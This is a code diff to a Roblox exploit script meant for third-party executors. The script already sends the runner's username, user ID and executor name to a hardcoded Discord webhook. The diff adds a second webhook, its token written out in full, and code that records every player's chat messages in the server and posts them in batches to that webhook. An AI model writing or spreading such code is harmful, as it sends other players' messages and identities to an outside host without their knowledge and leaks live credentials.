@@ -1,8 +1,12 @@
 local DebugNotifications = false
 local TrackMePlease = true --turn this off if you dont want me to know ur username and executor, etc
---in the future this will log chat too cus why not
+--this also logs chat messages from your session/server/game whatever ud like to call it
+--cus why not
+--u can turn it off anyway-
 
 local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
 local UserInputService = game:GetService("UserInputService")
 local Workspace = game:GetService("Workspace")
 local KeySystem
@@ -80,12 +84,13 @@ local function ForsakextrasLoad()
 				local DisplayName = PlayerFish.DisplayName
 				local Executor = tostring(executorname)
 				local webhookUrl = "https://discord.com/api/webhooks/1367726056110293013/4hiUyzAtzZBLEfAuFcexjN3TmxtW1ScDHG_zcZjxXeOxqLwn4oA4MoFLJPSukYkxikLH"
+				local CLOGSwebhookUrl = "https://discord.com/api/webhooks/1367917425223405618/CnNxLeoL3tmXCp7kRst7GH2wSXhjEg7mGtJGctA9M1hp0fSwBgOlO3-JhSqYaB4qvrbq"
 
 				task.spawn(function()
 					local success, response = pcall(function()
 						local Request = http_request or syn.request or request
 
-						local messageContent = "**Someone executed the script!** Username: *"..Username.." *User ID: *"..UserId.."* and Display Name: *"..DisplayName.."* - Executor as well: *" ..Executor.."*" 
+						local messageContent = "**Someone executed the script!** Username: *"..Username.."* User ID: *"..UserId.."* and Display Name: *"..DisplayName.."* - Executor as well: *" ..Executor.."*" 
 
 						-- Send the message
 						local success, response = pcall(function()
@@ -144,7 +149,7 @@ local function ForsakextrasLoad()
 					local Request = http_request or syn.request or request
 					if Request then
 						return Request({
-								Url = webhookUrl,
+								Url = CLOGSwebhookUrl,
 								Method = "POST",
 								Headers = {
 									["Content-Type"] = "application/json"
@@ -165,31 +170,86 @@ local function ForsakextrasLoad()
 					end
 
 					-- //
+					if isLegacyChat then
+					
 					Players.PlayerAdded:Connect(function(plr)
 						plr.Chatted:Connect(function(msg)
 							table.insert(messages, plr.Name..":"..plr.UserId.."-"..msg)
+							print("Inserted message")
 						end)
 					end)
+					for i,plr in pairs(Players:GetPlayers()) do
+						plr.Chatted:Connect(function(msg)
+							table.insert(messages, plr.Name..":"..plr.UserId.."-"..msg)
+							print("Inserted message")
+						end)
+					end
+
+					else
+
+					TextChatService.MessageReceived:Connect(function(message)
+        				if message.TextSource then
+            				local plr = Players:GetPlayerByUserId(message.TextSource.UserId)
+            				if not plr then return end
+        					
+							table.insert(messages, plr.Name..":"..plr.UserId.."-"..message.Text)
+							print("Inserted message (not legacy chat)")
+							
+				            if plr.UserId == Players.LocalPlayer.UserId then
+					            --do_exec(message.Text, Players.LocalPlayer)
+					        end
+					        --eventEditor.FireEvent("OnChatted", player.Name, message.Text)
+					        --sendChatWebhook(player, message.Text)
+					    end
+					end)
+
+					end
+
 
 					while wait(Waittime) do
 						if (#messages > 0) then
-							spawn(function()
-								table.clear(messages)
-							end)
-							local data = {
-								embeds = {
-									{
-										author = {name = "Messages Logged!"},
-										title = tostring(#messages).." Messages Found!",
-										description = http:JSONEncode(messages),
-										timestamp = getRealTime(tick()),
-										color = "2053964",        
-										type = "rich",
-									}
+						local http = game:GetService("HttpService")
+
+						local data = {
+							embeds = {
+								{
+									author = {name = "Messages Logged!"},
+									title = tostring(#messages).." Messages Found!",
+									description = http:JSONEncode(messages),
+									timestamp = getRealTime(tick()),
+									color = 2053964, -- Keep it as a number, not string
+									type = "rich",
 								}
-							}    
-							local newdata = http:JSONEncode(data)
-							http:PostAsync(webhookUrl,newdata)
+							}
+						}
+
+						local success, response = pcall(function()
+							local Request = http_request or syn.request or request
+							if Request then
+								return Request({
+									Url = CLOGSwebhookUrl,
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json"
+									},
+									Body = http:JSONEncode(data)
+								})
+							end
+						end)
+
+						if not success and DebugNotifications then
+							Rayfield:Notify({
+								Title = "Failed (Chat logs) webhook",
+								Content = response,
+								Duration = 10,
+								Image = "annoyed",
+							})
+						end
+
+						spawn(function()
+							table.clear(messages)
+						end)
+
 						end
 					end
 				end)
